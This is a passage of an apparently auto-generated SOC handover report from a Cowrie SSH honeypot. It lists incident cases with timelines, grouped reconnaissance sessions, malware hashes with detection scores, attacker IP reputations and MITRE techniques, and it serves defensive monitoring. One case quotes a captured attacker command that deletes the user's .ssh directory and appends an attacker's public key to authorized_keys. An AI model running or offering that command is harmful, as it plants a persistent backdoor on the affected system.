| `2026-05-19 16:29:38` | `cowrie.login.success` |
| `2026-05-19 16:29:38` | `cowrie.session.params` |
| `2026-05-19 16:29:38` | `cowrie.command.input` |
| `2026-05-19 16:29:38` | `cowrie.command.failed` |
| `2026-05-19 16:29:39` | `cowrie.log.closed` |
| `2026-05-19 16:29:39` | `cowrie.session.params` |
| `2026-05-19 16:29:39` | `cowrie.command.input` |
| `2026-05-19 16:29:40` | `cowrie.session.file_download` |
| `2026-05-19 16:29:40` | `cowrie.log.closed` |
| `2026-05-19 16:29:56` | `cowrie.session.params` |
| `2026-05-19 16:29:56` | `cowrie.command.input` |
| `2026-05-19 16:29:56` | `cowrie.log.closed` |
| `2026-05-19 16:29:57` | `cowrie.session.params` |
| `2026-05-19 16:29:57` | `cowrie.command.input` |
| `2026-05-19 16:29:57` | `cowrie.log.closed` |
| `2026-05-19 16:29:58` | `cowrie.session.params` |
| `2026-05-19 16:29:58` | `cowrie.command.input` |
| `2026-05-19 16:29:58` | `cowrie.session.file_download` |
| `2026-05-19 16:29:58` | `cowrie.log.closed` |
| `2026-05-19 16:29:59` | `cowrie.session.params` |
| `2026-05-19 16:29:59` | `cowrie.command.input` |
| `2026-05-19 16:30:00` | `cowrie.log.closed` |
| `2026-05-19 16:30:00` | `cowrie.session.params` |
| `2026-05-19 16:30:00` | `cowrie.command.input` |
| `2026-05-19 16:30:00` | `cowrie.log.closed` |
| `2026-05-19 16:30:01` | `cowrie.session.params` |
| `2026-05-19 16:30:01` | `cowrie.command.input` |
| `2026-05-19 16:30:01` | `cowrie.command.input` |
| `2026-05-19 16:30:01` | `cowrie.log.closed` |
| `2026-05-19 16:30:02` | `cowrie.session.params` |
| `2026-05-19 16:30:02` | `cowrie.command.input` |
| `2026-05-19 16:30:03` | `cowrie.log.closed` |
| `2026-05-19 16:30:03` | `cowrie.session.params` |
| `2026-05-19 16:30:03` | `cowrie.command.input` |
| `2026-05-19 16:30:04` | `cowrie.log.closed` |
| `2026-05-19 16:30:04` | `cowrie.session.params` |
| `2026-05-19 16:30:04` | `cowrie.command.input` |
| `2026-05-19 16:30:05` | `cowrie.log.closed` |
| `2026-05-19 16:30:05` | `cowrie.session.params` |
| `2026-05-19 16:30:05` | `cowrie.command.input` |
| `2026-05-19 16:30:06` | `cowrie.log.closed` |
| `2026-05-19 16:30:07` | `cowrie.session.params` |
| `2026-05-19 16:30:07` | `cowrie.command.input` |
| `2026-05-19 16:30:07` | `cowrie.log.closed` |
| `2026-05-19 16:30:08` | `cowrie.session.params` |
| `2026-05-19 16:30:08` | `cowrie.command.input` |
| `2026-05-19 16:30:08` | `cowrie.log.closed` |
| `2026-05-19 16:30:08` | `cowrie.session.params` |
| `2026-05-19 16:30:08` | `cowrie.command.input` |
| `2026-05-19 16:30:09` | `cowrie.log.closed` |
| `2026-05-19 16:30:09` | `cowrie.session.params` |
| `2026-05-19 16:30:09` | `cowrie.command.input` |
| `2026-05-19 16:30:10` | `cowrie.log.closed` |
| `2026-05-19 16:30:10` | `cowrie.session.params` |
| `2026-05-19 16:30:10` | `cowrie.command.input` |
| `2026-05-19 16:30:11` | `cowrie.log.closed` |
| `2026-05-19 16:30:11` | `cowrie.session.params` |
| `2026-05-19 16:30:11` | `cowrie.command.input` |
| `2026-05-19 16:30:11` | `cowrie.log.closed` |
| `2026-05-19 16:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.103.119[.]98` to AbuseIPDB if not already reported
- [ ] Block `180.103.119[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7849d87fd73f

| Field | Detail |
|---|---|
| **Source IP** | `180.103.119[.]98` |
| **First Seen** | 2026-05-19 16:34 |
| **Last Seen** | 2026-05-19 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:34:24` | `cowrie.session.connect` |
| `2026-05-19 16:34:24` | `cowrie.client.version` |
| `2026-05-19 16:34:24` | `cowrie.client.kex` |
| `2026-05-19 16:34:25` | `cowrie.login.success` |
| `2026-05-19 16:34:26` | `cowrie.session.params` |
| `2026-05-19 16:34:26` | `cowrie.command.input` |
| `2026-05-19 16:34:26` | `cowrie.command.failed` |
| `2026-05-19 16:34:26` | `cowrie.log.closed` |
| `2026-05-19 16:34:27` | `cowrie.session.params` |
| `2026-05-19 16:34:27` | `cowrie.command.input` |
| `2026-05-19 16:34:27` | `cowrie.session.file_download` |
| `2026-05-19 16:34:27` | `cowrie.log.closed` |
| `2026-05-19 16:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.103.119[.]98` to AbuseIPDB if not already reported
- [ ] Block `180.103.119[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d48e4d417b7

| Field | Detail |
|---|---|
| **Source IP** | `180.103.119[.]98` |
| **First Seen** | 2026-05-19 16:34 |
| **Last Seen** | 2026-05-19 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 16:34:31` | `cowrie.session.connect` |
| `2026-05-19 16:34:31` | `cowrie.client.version` |
| `2026-05-19 16:34:32` | `cowrie.client.kex` |
| `2026-05-19 16:34:33` | `cowrie.login.success` |
| `2026-05-19 16:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.103.119[.]98` to AbuseIPDB if not already reported
- [ ] Block `180.103.119[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.103.119[.]98` | **22** | 2026-05-19 16:17 | 2026-05-19 16:43 | 31m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **17** | 2026-05-19 15:46 | 2026-05-19 18:02 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `101.96.200[.]105` | 1 | 2026-05-19 17:13 | 2026-05-19 17:14 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `14.103.114[.]137` | 1 | 2026-05-19 16:07 | 2026-05-19 16:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.41[.]249` | 1 | 2026-05-19 16:20 | 2026-05-19 16:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.244.200[.]198` | 1 | 2026-05-19 16:14 | 2026-05-19 16:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.218[.]149` | 1 | 2026-05-19 16:07 | 2026-05-19 16:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-05-19 16:08 | 2026-05-19 16:09 | 56s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-05-19 16:07 | 2026-05-19 16:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]224` | 1 | 2026-05-19 16:56 | 2026-05-19 16:56 | 2s | 0 | `T1592` | 🟢 LOW |
| `213.6.215[.]34` | 1 | 2026-05-19 17:30 | 2026-05-19 17:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `223.123.38[.]123` | 1 | 2026-05-19 16:26 | 2026-05-19 16:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `43.153.80[.]54` | 1 | 2026-05-19 16:17 | 2026-05-19 16:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.229.102[.]187` | 1 | 2026-05-19 16:15 | 2026-05-19 16:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.76.24[.]115` | 1 | 2026-05-19 16:45 | 2026-05-19 16:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.210.75[.]108` | 1 | 2026-05-19 17:40 | 2026-05-19 17:40 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.38[.]123` | PK | CMPak Limited | **100** ⚠️ | 1 |
| `101.96.200[.]105` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 16 |
| `43.153.80[.]54` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 4 |
| `213.6.215[.]34` | PS | PALTEL | **100** ⚠️ | 6 |
| `8.210.75[.]108` | HK | Aliyun Computing Co.LTD | **100** ⚠️ | 7 |
| `180.103.119[.]98` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 46 |
| `152.244.200[.]198` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 32 |
| `180.106.83[.]59` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `152.32.218[.]149` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `14.103.41[.]249` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 32 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 101 cases |
| Tool 34  | Credential Extractor        | ✅ 22 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (35.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 16 recon entry/entries in table (2 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-19T18:10:03Z_
